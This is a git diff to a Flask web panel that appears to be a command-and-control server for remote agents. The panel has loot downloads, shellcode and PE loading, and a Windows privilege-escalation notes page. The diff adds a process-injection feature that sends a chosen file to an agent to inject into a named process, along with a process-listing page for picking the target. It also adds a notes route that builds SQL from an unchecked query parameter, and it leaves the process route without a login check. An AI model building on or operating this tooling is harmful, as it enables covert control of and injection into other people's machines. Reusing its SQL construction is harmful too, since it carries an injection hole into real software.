@@ -19,7 +19,8 @@ from flask_session import Session
 from flask_sqlalchemy import SQLAlchemy
 from Checks import *
 from flask_bcrypt import Bcrypt
-from flask_login import LoginManager,login_user,logout_user,current_user
+from flask_login import LoginManager,login_user,logout_user,current_user,login_required
+import sqlite3
 
 ip_address = '0.0.0.0'
 port_number = 1234
@@ -67,6 +68,7 @@ db = SQLAlchemy(app)
 bcrypt = Bcrypt(app)
 login_manager = LoginManager(app)
 login_manager.init_app(app)
+login_manager.login_view = 'login'
 
 @login_manager.user_loader
 def load_user(user_id):
@@ -99,7 +101,19 @@ def handle_connection(connection,address,thread_index):
         while True:
             if LOAD_INPUT[thread_index]!='' or CMD_INPUT[thread_index]!='' or FILE_INPUT[thread_index]!='' or TO_DOWNLOAD[thread_index]!='' or REG_INPUT[thread_index]!='':
 
-                if TO_DOWNLOAD[thread_index]!='':
+                if "Inject-" in CMD_INPUT[thread_index]:
+                    cmd = CMD_INPUT[thread_index]
+                    connection.send(cmd.encode())
+                    filename = cmd.split("-")[1]
+                    processname = cmd.split("-")[-1]
+                    fd = open("output\\{}".format(filename),'rb')
+                    content = fd.read()
+                    fd.close()
+                    connection.send(content)
+                    CMD_OUTPUT[thread_index]=connection.recv(2048).decode()
+                    CMD_INPUT[thread_index]=""
+
+                elif TO_DOWNLOAD[thread_index]!='':
                     # download-lengthoffiles
                     downloads = TO_DOWNLOAD[thread_index]
                     msg="download-"+str(len(downloads))+"-"+CWD[thread_index][0:-1]
@@ -318,10 +332,9 @@ def home():
 
 
 @app.route("/agents")
+@login_required
 def agents():
-    print(session)
-    if "name" not in session.keys():
-        return redirect("/home")
+    
     #print(THREADS)
     return render_template('agents.html',threads=THREADS,ips=IPS)
 
@@ -393,6 +406,7 @@ def execute(agentname):
 
 #testing lmao
 @app.route("/temp",methods=['GET','POST'])
+@login_required
 def temp():
     l =[['D',"test"],['F', 'LICENSE.txt'], ['F', 'NEWS.txt'], ['F', 'python.exe'], ['F', 'python3.dll'], ['F', 'python39.dll'], ['F', 'pythonw.exe'], ['F', 'vcruntime140.dll'], ['F', 'vcruntime140_1.dll']]
     if request.method=="POST":
@@ -595,6 +609,7 @@ def misc(agentname):
     
 
 @app.route("/loot/<imagename>")
+@login_required
 def send(imagename):
     return send_from_directory("loot",imagename)
 
@@ -606,6 +621,7 @@ def injectshellcode(agentname):
 
 
 @app.route("/<agentname>/LoadPE64",methods=["GET","POST"])
+@login_required
 def loadpe64(agentname):
     for i in THREADS:
         if agentname in i.name:
@@ -650,6 +666,7 @@ def login():
 
 
 @app.route("/logout")
+@login_required
 def logout():
     logout_user()
     
@@ -669,12 +686,15 @@ def register():
         confirm_password = request.form.get('confirm_password')
         if registerform.validate_on_submit():
             userexists = MyDBS.Login.query.filter_by(username=registerform.username.data).first()
-            #emailexists
+            emailexists = MyDBS.Login.query.filter_by(email=registerform.email.data).first()
             if userexists:
                 status = "Choose another username"
                 return render_template("register.html",regform=registerform,status=status)
+            if emailexists:
+                status = "Choose another email"
+                return render_template("register.html",regform=registerform,status=status)
             hash = bcrypt.generate_password_hash(registerform.password.data)
-            user = MyDBS.Login(username=registerform.username.data,password=hash)
+            user = MyDBS.Login(email=registerform.email.data,username=registerform.username.data,password=hash)
             db.session.add(user)
             db.session.commit()
             status = "Account Created Successfully"
@@ -689,7 +709,63 @@ def register():
     return render_template("register.html",regform=registerform)
 
 
+@app.route("/cheatsheet",methods=["GET","POST"])
+def cheatsheet():
+    try:
+        connector = sqlite3.connect("D:\\my_notes_db\\notes.db")
+        cursor = connector.cursor()
+        table_name = "windows_privesc"
+        if request.args.get('tablename'):
+            table_name = request.args.get('tablename')
+        data2 = cursor.execute("SELECT * FROM '{}';".format(table_name)).fetchall()
+        tables = cursor.execute("SELECT name from sqlite_master where type='table';").fetchall()
+        newtables = []
+        for i in tables:
+            for j in i:
+                newtables.append(j)
+        headers = cursor.execute("Select * from '{}';".format(table_name))
+        theaders = []
+        data1 = []
+        for i in headers.description:
+            theaders.append(i[0])
+        #print(theaders)
+        cursor.close()
+        connector.close()
+        newtables.sort()
+    except:
+        return render_template("notesdb.html")
+    return render_template("notesdb.html",data=data2,theaders=theaders,tables=newtables,table_name=table_name)
+
+
+
+@app.route("/<agentname>/processes",methods=["GET","POST"])
+def processes(agentname):
+    for i in THREADS:
+        if agentname in i.name:
+            req_index = THREADS.index(i)
+    CMD_INPUT[req_index] = "Get-Processes"
+    time.sleep(2)
+    data=str(CMD_OUTPUT[req_index]).split("\n")
+    print(data)
+    ffield = filefield1()
+    if  request.method=="POST":
+        CMD_INPUT[req_index] = "Get-Processes"
+        time.sleep(1)
+        data=str(CMD_OUTPUT[req_index]).split("\n")
+        print(request.form)
+        filetoinject= request.form.get('fileselector')
+        pname = request.args.get('pname')
+        fname = filetoinject
+        CMD_INPUT[req_index]="Inject-{}-{}".format(fname,pname)
+        time.sleep(1)
+        status = CMD_OUTPUT[req_index]
+        return render_template("processes.html",data=data,filefield=ffield,pname=pname,fname=fname,agentname=agentname,status=status)
+    return render_template("processes.html",data=data,filefield=ffield,agentname=agentname)
+    
+
+
 @app.route("/misc")
+@login_required
 def misc2():
     return render_template("misc.html")
 
